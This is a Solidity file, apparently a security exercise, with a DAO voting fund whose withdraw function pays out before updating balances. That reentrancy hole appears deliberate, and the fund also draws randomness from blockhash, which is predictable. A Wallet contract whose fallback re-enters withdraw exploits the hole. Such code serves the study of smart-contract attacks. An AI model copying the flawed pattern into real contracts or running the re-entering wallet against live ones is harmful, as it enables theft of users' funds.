pragma solidity ^0.4.10;

contract DAO {
    uint256 private totalBalance; // balance including both voted token and unvoted token
    uint256 private breakPointBalance; // when to seal the proposal
    mapping (address => uint256) private balances; // keep the unvoted tokens
    address[] private balanceAddresses; // keep the keys of the balances mapping
    address private curator; // who started the proposal
    uint256 private valuation; // exchange rate
    uint256 private preValuation;
    bool private unsealedProposal; // if there exists unsealed proposla
    mapping (address => mapping (bool => uint256)) private voteCount; // keep the history for vote
    address[] private voted; // keep the keys for voteCount mapping
    struct TotalCount{ // keep the total number of tokens voted on yes and no
        uint256 yes;
        uint256 no;
    }
    address[] splitRecord;
    TotalCount private totalCount;

    function DAO() public {
        curator = msg.sender;
        totalBalance = 0.0;
        valuation = 1.0;
        unsealedProposal = false;
    }

    function delegateCurator(address newCurator) public{
        require(curator == msg.sender && !unsealedProposal);
        curator = newCurator;
    }

    function deposit() public payable{
        require(!contains(splitRecord, msg.sender) || !unsealedProposal);
        uint256 numTokens = msg.value/valuation;
        uint256 numToReturn = msg.value%valuation;
        // solidity only support integer, thus need to reture the decimal part
        if(numToReturn > 0 && !msg.sender.call.value(numToReturn)()){
            throw;
        }
        totalBalance += numTokens;
        if(unsealedProposal){
            if(voteCount[msg.sender][true]>0) {
                voteCount[msg.sender][true]+=numTokens;
                totalCount.yes += numTokens;
                checkResult();
                return;
            }else if(voteCount[msg.sender][false]>0){
                voteCount[msg.sender][false]+=numTokens;
                totalCount.no += numTokens;
                checkResult();
                return;
            }
        }
        balances[msg.sender] += numTokens;
        if(!contains(balanceAddresses, msg.sender)){
            balanceAddresses.push(msg.sender);
        }
    }

    function withdraw(uint256 numTokens) public{
        require(numTokens>0 && totalBalance>=numTokens);
        if(!unsealedProposal && contains(splitRecord, msg.sender) && preValuation > 0){
            if(!msg.sender.call.value(numTokens*preValuation)()){
                throw;
            }
        }else{
            if(!msg.sender.call.value(numTokens*valuation)()){
                throw;
            }
        }
        balances[msg.sender] -= numTokens;
        totalBalance -= numTokens;
    }

    function getBalance() public constant returns(uint256){
        return balances[msg.sender];
    }

    function getValueation() public constant returns (uint256) {
        return valuation;
    }

    function getPreValueation() public constant returns (uint256) {
        return preValuation;
    }

    function getCurator() public constant returns (address) {
        return curator;
    }

    function getTotalBalance() public constant returns(uint256){
        return totalBalance;
    }

    function getYesCount() public constant returns(uint256){
        return totalCount.yes;
    }

    function getNoCount() public constant returns(uint256){
        return totalCount.no;
    }

    function createProposal() public{
        require(curator == msg.sender && !unsealedProposal);
        unsealedProposal = true;
        breakPointBalance = totalBalance / 2;
        resetVote();
    }

    function vote(uint256 numTokens, bool choice) public{
        require(unsealedProposal && (!contains(voted, msg.sender) || voteCount[msg.sender][choice]>0) && numTokens>0 && balances[msg.sender] >= numTokens);
        voteCount[msg.sender][choice] += numTokens;
        balances[msg.sender] -= numTokens;
        if(!contains(voted, msg.sender)){
            voted.push(msg.sender);
        }
        if(choice){
            totalCount.yes += numTokens;
        }else{
            totalCount.no += numTokens;
        }
        checkResult();
    }

    function checkResult() private{
        if(totalCount.yes>breakPointBalance){
            unsealedProposal = false;
            preValuation = valuation;
            valuation = (valuation*randomNumber()) / 10;
            if(valuation == 0){
                preValuation = 0;
                resetBalance();
            }else {
                tokenBack();
            }
        } else if(totalCount.no>breakPointBalance){
            unsealedProposal = false;
            preValuation = valuation;
            tokenBack();
        }
    }

    function contains(address[] array, address addr) private constant returns(bool){
        for(uint256 i=0; i<array.length; i++){
            if(array[i] == addr){
                return true;
            }
        }
        return false;
    }

    function resetVote() private {
        for(uint256 i=0; i<voted.length; i++){
            voteCount[voted[i]][true] = 0;
            voteCount[voted[i]][false] = 0;
        }
        delete voted;
        delete splitRecord;
        totalCount.yes = 0;
        totalCount.no = 0;
    }

    function resetBalance() private {
        totalBalance = 0;
        valuation = 1;
        for(uint256 i=0; i<balanceAddresses.length; i++){
            balances[balanceAddresses[i]] = 0;
        }
        delete balanceAddresses;
    }

    function tokenBack() private {
        for(uint256 i=0; i<voted.length; i++){
            balances[voted[i]] += voteCount[voted[i]][true] + voteCount[voted[i]][false];
        }
    }

    function randomNumber() private constant returns (uint256) {
        uint8[1000] memory random_numbers = [44, 13, 12, 12, 36, 0, 19, 8, 29, 22, 25, 29, 17, 25, 17, 1, 32, 14, 25, 24, 11, 20, 1, 3, 14, 19, 18, 23, 57, 26, 12, 22, 4, 15, 24, 14, 27, 30, 9, 27, 29, 26, 7, 19, 30, 1, 11, 28, 14, 22, 13, 15, 8, 30, 18, 4, 10, 5, 19, 43, 11, 24, 16, 16, 23, 27, 17, 18, 26, 31, 13, 27, 13, 38, 26, 34, 32, 14, 20, 28, 44, 28, 34, 19, 23, 16, 19, 30, 11, 15, 22, 23, 28, 14, 23, 5, 12, 32, 35, 25, 23, 11, 29, 7, 28, 15, 12, 25, 20, 21, 27, 10, 17, 31, 22, 19, 24, 24, 18, 34, 20, 6, 6, 13, 31, 23, 19, 13, 35, 24, 17, 27, 24, 17, 25, 16, 18, 24, 15, 14, 13, 7, 10, 29, 11, 24, 42, 16, 20, 5, 22, 23, 19, 5, 18, 35, 9, 14, 22, 16, 17, 28, 25, 14, 22, 19, 14, 30, 30, 26, 10, 32, 25, 16, 37, 31, 21, 19, 29, 11, 36, 13, 7, 26, 15, 26, 21, 16, 31, 20, 38, 3, 20, 12, 8, 21, 3, 21, 16, 9, 7, 29, 19, 24, 28, 15, 29, 31, 25, 25, 13, 1, 15, 23, 14, 19, 22, 14, 21, 5, 22, 11, 2, 20, 30, 28, 1, 33, 29, 6, 6, 30, 14, 19, 15, 28, 29, 10, 15, 11, 30, 5, 10, 12, 2, 29, 38, 7, 16, 15, 19, 17, 3, 22, 37, 17, 19, 19, 13, 16, 32, 3, 14, 27, 26, 19, 13, 17, 5, 29, 16, 0, 14, 21, 18, 16, 26, 34, 26, 9, 13, 21, 32, 13, 21, 15, 11, 22, 35, 27, 17, 18, 34, 28, 22, 7, 10, 23, 18, 9, 23, 16, 25, 29, 7, 14, 21, 18, 26, 20, 10, 6, 8, 32, 28, 21, 8, 10, 28, 28, 2, 7, 24, 8, 30, 39, 28, 19, 21, 24, 33, 20, 9, 33, 26, 27, 18, 27, 24, 8, 8, 23, 16, 22, 35, 15, 8, 16, 19, 45, 20, 26, 23, 32, 22, 21, 9, 40, 1, 11, 0, 25, 18, 18, 11, 13, 3, 24, 14, 23, 16, 44, 10, 31, 17, 18, 7, 13, 14, 18, 24, 33, 32, 29, 18, 48, 17, 13, 24, 23, 34, 29, 39, 15, 21, 24, 32, 20, 25, 22, 15, 16, 32, 1, 11, 28, 4, 21, 11, 24, 30, 1, 24, 11, 0, 26, 18, 30, 24, 22, 7, 7, 14, 25, 4, 23, 5, 25, 10, 27, 23, 7, 20, 14, 19, 18, 23, 10, 23, 32, 27, 11, 2, 10, 31, 19, 14, 26, 11, 27, 46, 26, 33, 19, 18, 7, 27, 12, 33, 21, 32, 20, 25, 35, 18, 19, 30, 24, 31, 20, 12, 10, 25, 22, 17, 18, 20, 25, 14, 24, 3, 25, 14, 20, 21, 28, 19, 27, 21, 16, 9, 27, 28, 6, 0, 13, 9, 14, 17, 27, 28, 6, 15, 35, 13, 13, 19, 16, 7, 16, 19, 35, 33, 25, 15, 3, 29, 8, 25, 27, 32, 19, 27, 24, 4, 29, 12, 27, 6, 11, 23, 13, 22, 6, 18, 26, 29, 17, 28, 5, 20, 27, 23, 20, 16, 21, 28, 6, 26, 18, 9, 28, 28, 26, 32, 17, 14, 10, 11, 7, 37, 23, 7, 3, 24, 22, 32, 32, 14, 29, 10, 17, 19, 30, 14, 23, 29, 44, 32, 29, 26, 23, 40, 22, 31, 3, 38, 22, 18, 32, 26, 29, 17, 29, 19, 15, 20, 9, 18, 2, 7, 15, 29, 31, 22, 23, 15, 31, 8, 10, 34, 40, 25, 38, 27, 29, 32, 26, 29, 5, 0, 27, 31, 22, 18, 25, 27, 22, 20, 23, 10, 37, 15, 19, 6, 17, 12, 16, 31, 26, 34, 42, 20, 11, 23, 7, 15, 12, 22, 18, 38, 22, 43, 28, 0, 19, 21, 39, 28, 17, 9, 19, 20, 26, 18, 35, 17, 4, 27, 27, 21, 26, 19, 32, 11, 25, 33, 31, 13, 25, 14, 18, 2, 14, 10, 20, 29, 10, 39, 20, 14, 0, 7, 12, 18, 29, 32, 30, 24, 12, 17, 13, 4, 19, 16, 23, 25, 46, 22, 13, 23, 11, 10, 0, 31, 16, 18, 25, 12, 35, 40, 8, 27, 11, 9, 11, 35, 34, 6, 15, 25, 29, 25, 6, 30, 37, 25, 17, 28, 8, 31, 19, 17, 18, 24, 13, 23, 22, 19, 30, 22, 18, 23, 13, 17, 14, 18, 34, 15, 33, 23, 22, 33, 8, 17, 41, 15, 2, 11, 22, 6, 1, 32, 15, 10, 12, 16, 28, 23, 13, 32, 30, 9, 19, 16, 7, 39, 16, 31, 23, 23, 13, 16, 16, 21, 2, 10, 14, 39, 20, 34, 10, 6, 18, 33, 14, 28, 16, 16, 21, 21, 14, 7, 31, 8, 10, 19, 27, 43, 13, 1, 15, 27, 21, 15, 26, 11, 15, 42, 23, 5, 32, 14, 28, 35, 23, 16, 13, 25, 11, 24, 15, 18, 27, 21, 26, 26, 23, 10, 25, 28, 5, 38, 17, 18, 13, 27, 20, 15, 38, 21, 16, 4, 13, 23, 24, 15, 19, 20, 16, 17, 12, 14, 27, 14, 27, 20, 13, 3, 29, 0, 16, 22, 11, 40, 8, 11, 19, 11, 33, 18, 34, 26, 21, 22, 14, 15, 17, 4, 21, 10, 24, 22, 5, 16, 13, 11, 8, 25, 4, 16, 32, 27, 27, 7, 29, 21, 31, 23, 8, 9, 19, 23, 19, 32, 15, 30, 9, 25, 37, 46, 23, 24, 27, 19, 15, 8, 17, 16, 21, 36, 31, 35, 25, 21, 23, 25, 32, 15, 24, 24, 0, 20, 19, 28, 37, 22, 15, 10, 1, 20, 11, 24, 22, 12, 23, 20, 23, 27, 27, 30, 29, 6, 16, 18, 14, 19, 0, 21, 30, 30, 25, 43, 28, 25, 21, 12, 28, 14, 4, 27, 24, 20, 19, 16, 14, 21, 15, 22, 3];
        uint256 index = uint256(block.blockhash(block.number-1))%1000;
        return random_numbers[index];
    }

    function split() public {
        require(unsealedProposal && contains(voted, msg.sender));
        if(!contains(splitRecord, msg.sender)){
            splitRecord.push(msg.sender);
        }
    }
}


contract Wallet {
    DAO private vulnerableDao;
    uint256 times;

    function() public payable {
        if(times == 0){
            times = 1;
            vulnerableDao.withdraw(msg.value);
        }else{
            times = 0;
        }
    }

    function collectFund() public payable {}

    function Wallet(address DaoAddress) public {
        vulnerableDao = DAO(DaoAddress);
    }

    function createProposal() public{
        vulnerableDao.createProposal();
    }
    function deposit(uint256 amount) public{
        vulnerableDao.deposit.value(amount)();
    }

    function withdraw(uint256 numTokens) public{
        vulnerableDao.withdraw(numTokens);
    }

    function getDaoBalance() constant public returns (uint256) {
        return vulnerableDao.getBalance();
    }

    function getBalance() constant public returns (uint256) {
        return this.balance;
    }

    function delegateCurator(address addr) public{
        vulnerableDao.delegateCurator(addr);
    }

    function vote(uint256 numTokens, bool choice) public{
        vulnerableDao.vote(numTokens, choice);
    }

    function split() public{
        vulnerableDao.split();
    }
}
